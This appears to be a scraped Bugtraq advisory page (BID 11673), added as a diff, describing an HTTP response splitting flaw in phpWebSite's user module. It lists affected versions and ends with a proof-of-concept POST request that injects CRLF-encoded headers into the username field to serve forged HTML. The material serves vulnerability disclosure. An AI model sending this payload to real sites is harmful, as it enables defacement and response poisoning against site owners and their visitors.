@@ -1,0 +1,119 @@
+#SpeeDr00t@Black Falcon<br>#bid11673<p><b><span style="font-size: 18pt;">PHPWebSite User Module HTTP Response Splitting Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/11673/info">info</a><br><a href="http://www.securityfocus.com/bid/11673/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/11673/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/11673/solution">solution</a><br><a href="http://www.securityfocus.com/bid/11673/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				11673
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 04 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Nov 04 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of this issue is credited to "Maestro De-Seguridad" &lt;maestrodeseguridad@lycos.com&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					phpWebsite phpWebsite 0.9.3 -4<br/>
+					
+				
+					phpWebsite phpWebsite 0.9.3 -3<br/>
+					
+				
+					phpWebsite phpWebsite 0.9.3 -2<br/>
+					
+				
+					phpWebsite phpWebsite 0.9.3 -1<br/>
+					
+				
+					phpWebsite phpWebsite 0.9.3 <br/>
+					
+				
+					phpWebsite phpWebsite 0.8.3 <br/>
+					
+				
+					phpWebsite phpWebsite 0.8.2 <br/>
+					
+				
+					phpWebsite phpWebsite 0.7.3 <br/>
+					
+				
+					Gentoo Linux  <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required to leverage this issue.  The following proof of concept has been provided:<br/><br/>POST /index.php HTTP/1.0<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-length: 218<br/>Connection: Keep-Alive<br/><br/>http://www.example.com/module=user&amp;norm_user_op=login&amp;block_username=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20Ok%0d%0aContent-Length:%2031%0d%0aContent-Type:%20text/html%0d%0a%0d%0a&lt;html&gt;This site in 0wned{/html}&amp;password=foobar
+	
+		<ul>
+</ul>
+</div>
